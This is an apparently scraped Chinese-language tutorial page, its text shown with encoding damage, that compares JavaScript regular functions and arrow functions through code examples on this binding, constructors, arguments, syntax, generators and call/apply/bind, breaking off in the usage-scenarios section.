ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. æ ¸å¿ƒåŒºåˆ«æ¦‚è§ˆ</h2>


















































<table><thead><tr><th>ç‰¹æ€§</th><th>æ™®é€šå‡½æ•° (Function)</th><th>ç®­å¤´å‡½æ•° (Arrow Function)</th></tr></thead><tbody><tr><td><strong>thisç»‘å®š</strong></td><td>åŠ¨æ€ç»‘å®šï¼Œå–å†³äºè°ƒç”¨æ–¹å¼</td><td>è¯æ³•ç»‘å®šï¼Œç»§æ‰¿å¤–å±‚ä½œç”¨åŸŸçš„this</td></tr><tr><td><strong>argumentså¯¹è±¡</strong></td><td>æœ‰</td><td>æ— </td></tr><tr><td><strong>æ„é€ å‡½æ•°</strong></td><td>å¯ä»¥ï¼Œå¯ä½¿ç”¨new</td><td>ä¸å¯ä»¥ï¼Œä½¿ç”¨newä¼šæŠ¥é”™</td></tr><tr><td><strong>prototypeå±æ€§</strong></td><td>æœ‰</td><td>æ— </td></tr><tr><td><strong>yieldå…³é”®å­—</strong></td><td>å¯ä»¥åœ¨ç”Ÿæˆå™¨å‡½æ•°ä¸­ä½¿ç”¨</td><td>ä¸èƒ½ä½¿ç”¨ï¼ˆé™¤éå¤–å±‚æ˜¯æ™®é€šå‡½æ•°ï¼‰</td></tr><tr><td><strong>è¯­æ³•</strong></td><td>æœ‰å¤šç§å½¢å¼</td><td>æ›´ç®€æ´ï¼Œé€‚åˆå›è°ƒå‡½æ•°</td></tr><tr><td><strong>é‡å¤å‘½åå‚æ•°</strong></td><td>ä¸¥æ ¼æ¨¡å¼ä¸‹ä¸å…è®¸</td><td>ä¸å…è®¸</td></tr><tr><td><strong>super</strong></td><td>å¯ä»¥åœ¨ç±»æ–¹æ³•ä¸­ä½¿ç”¨</td><td>å¯ä»¥åœ¨ç±»æ–¹æ³•ä¸­ä½¿ç”¨ï¼ˆéœ€æ³¨æ„thisï¼‰</td></tr></tbody></table>
<h2 data-id="heading-1">2. è¯¦ç»†å¯¹æ¯”åˆ†æ</h2>
<h3 data-id="heading-2">2.1 this ç»‘å®šçš„åŒºåˆ«ï¼ˆæœ€é‡è¦ï¼ï¼‰</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ™®é€šå‡½æ•°çš„ this æ˜¯åŠ¨æ€ç»‘å®šçš„</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Alice'</span>,
  <span class="hljs-attr">regularFunc</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Regular:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  },
  <span class="hljs-attr">arrowFunc</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Arrow:'</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
  }
};

obj.<span class="hljs-title function_">regularFunc</span>(); <span class="hljs-comment">// 'Regular: Alice' - this æŒ‡å‘ obj</span>
obj.<span class="hljs-title function_">arrowFunc</span>();   <span class="hljs-comment">// 'Arrow: undefined' - this æŒ‡å‘å¤–å±‚ä½œç”¨åŸŸï¼ˆè¿™é‡Œå¯èƒ½æ˜¯windowæˆ–globalï¼‰</span>

<span class="hljs-comment">// æ›´æ¸…æ™°çš„ä¾‹å­</span>
<span class="hljs-keyword">const</span> person = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">'Bob'</span>,
  <span class="hljs-attr">hobbies</span>: [<span class="hljs-string">'reading'</span>, <span class="hljs-string">'coding'</span>],
  
  <span class="hljs-attr">showHobbiesRegular</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hobbies</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">hobby</span>) {
      <span class="hljs-comment">// è¿™é‡Œçš„ this æŒ‡å‘å…¨å±€å¯¹è±¡ï¼Œä¸æ˜¯ person</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> likes <span class="hljs-subst">${hobby}</span>`</span>);
      <span class="hljs-comment">// è¾“å‡º: undefined likes reading</span>
    });
  },
  
  <span class="hljs-attr">showHobbiesArrow</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">hobbies</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">hobby</span>) =&gt;</span> {
      <span class="hljs-comment">// ç®­å¤´å‡½æ•°ç»§æ‰¿å¤–å±‚å‡½æ•°çš„ this</span>
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> likes <span class="hljs-subst">${hobby}</span>`</span>);
      <span class="hljs-comment">// è¾“å‡º: Bob likes reading, Bob likes coding</span>
    });
  }
};

person.<span class="hljs-title function_">showHobbiesRegular</span>();
person.<span class="hljs-title function_">showHobbiesArrow</span>();

<span class="hljs-comment">// äº‹ä»¶ç›‘å¬ä¸­çš„ this</span>
<span class="hljs-keyword">const</span> button = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'button'</span>);

button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// &lt;button&gt; - this æŒ‡å‘æŒ‰é’®å…ƒç´ </span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// Window - this æŒ‡å‘å…¨å±€å¯¹è±¡</span>
  }, <span class="hljs-number">100</span>);
});

button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// &lt;button&gt; - this æŒ‡å‘æŒ‰é’®å…ƒç´ </span>
  <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// &lt;button&gt; - ç®­å¤´å‡½æ•°ç»§æ‰¿å¤–å±‚ this</span>
  }, <span class="hljs-number">100</span>);
});
</code></pre>
<h3 data-id="heading-3">2.2 æ„é€ å‡½æ•°ä¸ new</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ™®é€šå‡½æ•°å¯ä»¥ä½œä¸ºæ„é€ å‡½æ•°</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">greet</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>;
};

<span class="hljs-keyword">const</span> alice = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Alice'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(alice.<span class="hljs-title function_">greet</span>()); <span class="hljs-comment">// "Hello, I'm Alice"</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°ä¸èƒ½ä½œä¸ºæ„é€ å‡½æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">Animal</span> = (<span class="hljs-params">name</span>) =&gt; {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// é”™è¯¯ï¼</span>
};

<span class="hljs-comment">// const dog = new Animal('Dog'); // TypeError: Animal is not a constructor</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°æ²¡æœ‰ prototype å±æ€§</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// {greet: Æ’, constructor: Æ’}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// undefined</span>
</code></pre>
<h3 data-id="heading-4">2.3 arguments å¯¹è±¡</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ™®é€šå‡½æ•°æœ‰ arguments å¯¹è±¡</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">regularSum</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>); <span class="hljs-comment">// [1, 2, 3, 4, 5]</span>
  <span class="hljs-keyword">let</span> total = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">length</span>; i++) {
    total += <span class="hljs-variable language_">arguments</span>[i];
  }
  <span class="hljs-keyword">return</span> total;
}
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">regularSum</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// 15</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°æ²¡æœ‰ arguments å¯¹è±¡</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">arrowSum</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// console.log(arguments); // ReferenceError: arguments is not defined</span>
  <span class="hljs-comment">// ä½¿ç”¨ rest å‚æ•°æ›¿ä»£</span>
};

<span class="hljs-comment">// ç®­å¤´å‡½æ•°ä¸­è®¿é—® arguments ä¼šå‘ä¸ŠæŸ¥æ‰¾</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">outer</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">inner</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">arguments</span>); <span class="hljs-comment">// ç»§æ‰¿å¤–å±‚çš„ arguments</span>
  };
  <span class="hljs-title function_">inner</span>();
}
<span class="hljs-title function_">outer</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>); <span class="hljs-comment">// [1, 2, 3]</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°åº”è¯¥ä½¿ç”¨ rest å‚æ•°</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">arrowSumWithRest</span> = (<span class="hljs-params">...args</span>) =&gt; {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(args); <span class="hljs-comment">// [1, 2, 3, 4, 5]</span>
  <span class="hljs-keyword">return</span> args.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">total, num</span>) =&gt;</span> total + num, <span class="hljs-number">0</span>);
};
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">arrowSumWithRest</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)); <span class="hljs-comment">// 15</span>
</code></pre>
<h3 data-id="heading-5">2.4 è¯­æ³•å·®å¼‚</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ™®é€šå‡½æ•°æœ‰å¤šç§å®šä¹‰æ–¹å¼</span>
<span class="hljs-comment">// 1. å‡½æ•°å£°æ˜</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add1</span>(<span class="hljs-params">a, b</span>) { <span class="hljs-keyword">return</span> a + b; }

<span class="hljs-comment">// 2. å‡½æ•°è¡¨è¾¾å¼</span>
<span class="hljs-keyword">const</span> add2 = <span class="hljs-keyword">function</span>(<span class="hljs-params">a, b</span>) { <span class="hljs-keyword">return</span> a + b; };

<span class="hljs-comment">// 3. å‘½åå‡½æ•°è¡¨è¾¾å¼</span>
<span class="hljs-keyword">const</span> add3 = <span class="hljs-keyword">function</span> <span class="hljs-title function_">sum</span>(<span class="hljs-params">a, b</span>) { <span class="hljs-keyword">return</span> a + b; };

<span class="hljs-comment">// 4. æ„é€ å‡½æ•°ï¼ˆä¸æ¨èï¼‰</span>
<span class="hljs-keyword">const</span> add4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function</span>(<span class="hljs-string">'a'</span>, <span class="hljs-string">'b'</span>, <span class="hljs-string">'return a + b'</span>);

<span class="hljs-comment">// ç®­å¤´å‡½æ•°çš„ç®€æ´è¯­æ³•</span>
<span class="hljs-comment">// 1. åŸºæœ¬å½¢å¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">addArrow1</span> = (<span class="hljs-params">a, b</span>) =&gt; { <span class="hljs-keyword">return</span> a + b; };

<span class="hljs-comment">// 2. çœç•¥å¤§æ‹¬å·å’Œreturnï¼ˆåªæœ‰ä¸€æ¡è¡¨è¾¾å¼æ—¶ï¼‰</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">addArrow2</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;

<span class="hljs-comment">// 3. å•ä¸ªå‚æ•°å¯çœç•¥æ‹¬å·</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">square</span> = x =&gt; x * x;

<span class="hljs-comment">// 4. æ— å‚æ•°éœ€è¦æ‹¬å·</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getRandom</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>();

<span class="hljs-comment">// 5. è¿”å›å¯¹è±¡éœ€è¦æ‹¬å·</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">createUser</span> = (<span class="hljs-params">name, age</span>) =&gt; ({ name, age });

<span class="hljs-comment">// 6. å¤šè¡Œè¯­å¥éœ€è¦å¤§æ‹¬å·</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">processData</span> = (<span class="hljs-params">data</span>) =&gt; {
  <span class="hljs-keyword">const</span> processed = data.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">active</span>);
  <span class="hljs-keyword">return</span> processed.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">value</span>);
};
</code></pre>
<h3 data-id="heading-6">2.5 æ–¹æ³•å®šä¹‰ä¸ç±»ä¸­çš„ä½¿ç”¨</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¯¹è±¡æ–¹æ³•</span>
<span class="hljs-keyword">const</span> calculator = {
  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  
  <span class="hljs-comment">// æ™®é€šå‡½æ•°æ–¹æ³• - this æŒ‡å‘ calculator</span>
  <span class="hljs-attr">doubleRegular</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>;
  },
  
  <span class="hljs-comment">// ç®­å¤´å‡½æ•°æ–¹æ³• - this ç»§æ‰¿å¤–å±‚ï¼Œå¯èƒ½ä¸æ˜¯ calculator</span>
  <span class="hljs-attr">doubleArrow</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>; <span class="hljs-comment">// this å¯èƒ½æ˜¯ undefined</span>
  },
  
  <span class="hljs-comment">// ç®€å†™æ–¹æ³•ï¼ˆES6ï¼‰- è¡Œä¸ºç±»ä¼¼æ™®é€šå‡½æ•°</span>
  <span class="hljs-title function_">doubleShorthand</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span> * <span class="hljs-number">2</span>;
  }
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calculator.<span class="hljs-title function_">doubleRegular</span>()); <span class="hljs-comment">// 20</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calculator.<span class="hljs-title function_">doubleArrow</span>());   <span class="hljs-comment">// NaN (this.value æ˜¯ undefined)</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(calculator.<span class="hljs-title function_">doubleShorthand</span>()); <span class="hljs-comment">// 20</span>

<span class="hljs-comment">// ç±»ä¸­çš„æ–¹æ³•</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">greetArrow</span> = <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Arrow: Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
    };
  }
  
  <span class="hljs-comment">// ç±»æ–¹æ³•æ˜¯æ™®é€šå‡½æ•°ï¼Œthis æŒ‡å‘å®ä¾‹</span>
  <span class="hljs-title function_">greetRegular</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Regular: Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
  
  <span class="hljs-comment">// ç®­å¤´å‡½æ•°ä½œä¸ºç±»å­—æ®µ</span>
  greetArrowField = <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Arrow Field: Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  };
}

<span class="hljs-keyword">const</span> bob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'Bob'</span>);
bob.<span class="hljs-title function_">greetRegular</span>();    <span class="hljs-comment">// "Regular: Hello, I'm Bob"</span>
bob.<span class="hljs-title function_">greetArrow</span>();      <span class="hljs-comment">// "Arrow: Hello, I'm Bob"</span>
bob.<span class="hljs-title function_">greetArrowField</span>(); <span class="hljs-comment">// "Arrow Field: Hello, I'm Bob"</span>

<span class="hljs-comment">// æ–¹æ³•è§£ç»‘é—®é¢˜</span>
<span class="hljs-keyword">const</span> { greetRegular } = bob;
<span class="hljs-keyword">const</span> { greetArrow } = bob;
<span class="hljs-keyword">const</span> { greetArrowField } = bob;

<span class="hljs-title function_">greetRegular</span>();    <span class="hljs-comment">// "Regular: Hello, I'm undefined" - this ä¸¢å¤±</span>
<span class="hljs-title function_">greetArrow</span>();      <span class="hljs-comment">// "Arrow: Hello, I'm Bob" - ç®­å¤´å‡½æ•°ä¿æŒ this</span>
<span class="hljs-title function_">greetArrowField</span>(); <span class="hljs-comment">// "Arrow Field: Hello, I'm Bob" - ç®­å¤´å‡½æ•°ä¿æŒ this</span>
</code></pre>
<h3 data-id="heading-7">2.6 ç”Ÿæˆå™¨å‡½æ•°ä¸ yield</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ™®é€šå‡½æ•°å¯ä»¥æ˜¯ç”Ÿæˆå™¨å‡½æ•°</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">regularGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>;
  <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>;
  <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>;
}

<span class="hljs-keyword">const</span> gen = <span class="hljs-title function_">regularGenerator</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 1</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(gen.<span class="hljs-title function_">next</span>().<span class="hljs-property">value</span>); <span class="hljs-comment">// 2</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°ä¸èƒ½æ˜¯ç”Ÿæˆå™¨å‡½æ•°</span>
<span class="hljs-comment">// const arrowGenerator = *() =&gt; {}; // SyntaxError</span>

<span class="hljs-comment">// ä½†å¯ä»¥åœ¨ç®­å¤´å‡½æ•°ä¸­ä½¿ç”¨ yieldï¼Œå¦‚æœå¤–å±‚æ˜¯ç”Ÿæˆå™¨å‡½æ•°</span>
<span class="hljs-keyword">function</span>* <span class="hljs-title function_">outerGenerator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">inner</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-comment">// è¿™é‡Œä¸èƒ½ç›´æ¥ä½¿ç”¨ yield</span>
    <span class="hljs-comment">// ä½†å¯ä»¥é€šè¿‡ yield* å§”æ‰˜ç»™å…¶ä»–ç”Ÿæˆå™¨</span>
  };
  
  <span class="hljs-keyword">yield</span>* [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]; <span class="hljs-comment">// ä½¿ç”¨ yield* å§”æ‰˜</span>
}
</code></pre>
<h3 data-id="heading-8">2.7 call, apply, bind çš„å½±å“</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> obj1 = { <span class="hljs-attr">value</span>: <span class="hljs-number">10</span> };
<span class="hljs-keyword">const</span> obj2 = { <span class="hljs-attr">value</span>: <span class="hljs-number">20</span> };

<span class="hljs-keyword">function</span> <span class="hljs-title function_">regularFunc</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">arrowFunc</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>;
};

<span class="hljs-comment">// æ™®é€šå‡½æ•°å¯ä»¥é€šè¿‡ call/apply/bind æ”¹å˜ this</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regularFunc.<span class="hljs-title function_">call</span>(obj1)); <span class="hljs-comment">// 10</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(regularFunc.<span class="hljs-title function_">apply</span>(obj2)); <span class="hljs-comment">// 20</span>
<span class="hljs-keyword">const</span> boundFunc = regularFunc.<span class="hljs-title function_">bind</span>(obj1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">boundFunc</span>()); <span class="hljs-comment">// 10</span>

<span class="hljs-comment">// ç®­å¤´å‡½æ•°çš„ this ä¸å¯æ”¹å˜</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrowFunc.<span class="hljs-title function_">call</span>(obj1)); <span class="hljs-comment">// undefinedï¼ˆthis ä»ç„¶æ˜¯å¤–å±‚ä½œç”¨åŸŸçš„ thisï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrowFunc.<span class="hljs-title function_">apply</span>(obj2)); <span class="hljs-comment">// undefined</span>
<span class="hljs-keyword">const</span> boundArrow = arrowFunc.<span class="hljs-title function_">bind</span>(obj1);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">boundArrow</span>()); <span class="hljs-comment">// undefined</span>
</code></pre>
<h2 data-id="heading-9">3. å®é™…åº”ç”¨åœºæ™¯</h2>
<h3 data-id="heading-10">3.1 ä½•æ—¶ä½¿ç”¨ç®­å¤´å‡½æ•°</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 1. å›è°ƒå‡½æ•°ï¼ˆå°¤å…¶æ˜¯éœ€è¦ä¿æŒ this çš„æƒ…å†µï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Timer</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">seconds</span> = <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// é”™è¯¯ï¼šæ™®é€šå‡½æ•°ä¼šä¸¢å¤± this</span>
    <span class="hljs-comment">// setInterval(function() {</span>
    <span class="hljs-comment">//   this.seconds++; // this æŒ‡å‘ window</span>
    <span class="hljs-comment">// }, 1000);</span>
    
    <span class="hljs-comment">// æ­£ç¡®ï¼šç®­å¤´å‡½æ•°ä¿æŒ this</span>
    <span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">seconds</span>++;
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">seconds</span>);
    }, <span class="hljs-number">1000</span>);
  }
}

<span class="hljs-comment">// 2. æ•°ç»„æ–¹æ³•å›è°ƒ</span>
<span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>];
<span class="hljs-keyword">const</span> doubled = numbers.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n * <span class="hljs-number">2</span>);
<span class="hljs-keyword">const</span> evens = numbers.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">n</span> =&gt;</span> n % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>);
<span class="hljs-keyword">const</span> sum = numbers.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">total, n</span>) =&gt;</span> total + n, <span class="hljs-number">0</span>);

<span class="hljs-comment">// 3. ç®€çŸ­çš„å‡½æ•°è¡¨è¾¾å¼</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">add</span> = (<span class="hljs-params">a, b</span>) =&gt; a + b;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">isEven</span> = n =&gt; n % <span class="hljs-number">2</span> === <span class="hljs-number">0</span>;
<span class="hljs-keyword">const</span> <span class="hljs-title function_">getKey</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">random</span>().<span class="hljs-title function_">toString</span>(<span class="hljs-number">36</span>).<span class="hljs-title function_">substr</span>(<span class="hljs-number">2</span>);

<span class="hljs-comment">// 4. ç«‹å³æ‰§è¡Œå‡½æ•°ï¼ˆIIFEï¼‰</span>
<span class="hljs-keyword">const</span> result = (<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> x = <span class="hljs-number">10</span>;
  <span class="hljs-keyword">const</span> y = <span class="hljs-number">20</span>;
  <span class="hljs-keyword">return</span> x + y;
})();

<span class="hljs-comment">// 5. å‡½æ•°å¼ç¼–ç¨‹</span>
